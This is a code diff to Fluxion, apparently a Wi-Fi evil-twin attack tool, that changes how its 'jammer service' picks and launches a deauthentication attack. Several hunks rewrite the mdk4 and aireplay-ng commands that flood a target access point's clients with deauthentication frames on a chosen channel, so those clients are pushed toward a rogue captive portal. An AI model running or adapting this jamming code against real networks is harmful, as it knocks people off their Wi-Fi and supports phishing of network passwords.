@@ -189,7 +189,11 @@ function captive_portal_set_ap_service() {
   captive_portal_unset_ap_service
 
   if [ "$FLUXIONAuto" ]; then
-    option_deauth=1  # Default to mdk4 in auto mode.
+    if [ "$FLUXIONDeauthMethod" = "mdk4" ]; then
+      option_deauth=1
+    else
+      option_deauth=2  # Default to aireplay-ng in auto mode until mdk4's traffic-wait issue is fixed upstream.
+    fi
   else
     fluxion_header
 
@@ -1457,14 +1461,12 @@ captive_portal_stop_jammer_service() {
     fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
     CaptivePortalJammerServiceXtermPID=""
   fi
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 }
 
 captive_portal_start_jammer_service() {
   if [ "$CaptivePortalJammerServiceXtermPID" ]; then return 0; fi
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
-  echo -e "$FluxionTargetMAC" > "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 
   local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
   if [ "$currentMode" != "monitor" ]; then
@@ -1475,7 +1477,7 @@ captive_portal_start_jammer_service() {
   if [[ $option_deauth -eq 1 ]]; then
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-      "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
+      "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -B $FluxionTargetMAC"
   elif [[ $option_deauth -eq 2 ]]; then
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
